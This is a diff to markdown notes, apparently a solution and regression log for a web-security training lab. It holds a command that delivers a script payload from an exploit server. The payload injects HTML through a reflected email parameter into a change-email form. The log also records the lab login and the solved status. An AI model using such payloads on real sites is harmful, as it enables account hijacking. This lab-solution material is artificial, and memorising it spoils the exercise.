@@ -48,3 +48,9 @@ lab_launch launch 417F3BDBF234C3C15104E0712F05C5F080950E7ECC18C37B7FDAFDE0149BE0
 lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<script>location="https://<inst>/my-account?email=hacker%40evil-user.net%22%3E%3Cbutton%20type%3Dsubmit%3EClick%3C%2Fbutton%3E"</script>' --form formAction=DELIVER_TO_VICTIM --follow
 solved_check "<inst>/" --jar /tmp/b15-jar3.json
 ```
+
+## R1 回归验证
+
+实例 `0a040031042cb88583bb4bfc00b900a9`,exploit `exploit-0ad9007a04feb8ac83994a26017200cf`。
+`login` wiener:peter 成功(csrf 从 /login 表单取);`/my-account?email=` 反射实测 `value="PROBE1">PROBE2"`(确在 change-email 表单内、csrf 隐藏域之前);
+payload URL + `DELIVER_TO_VICTIM` 一次交付后,exploit 页即显示 `is-solved`,实例 banner `solved:true`。件:http_session + banner_verdict。
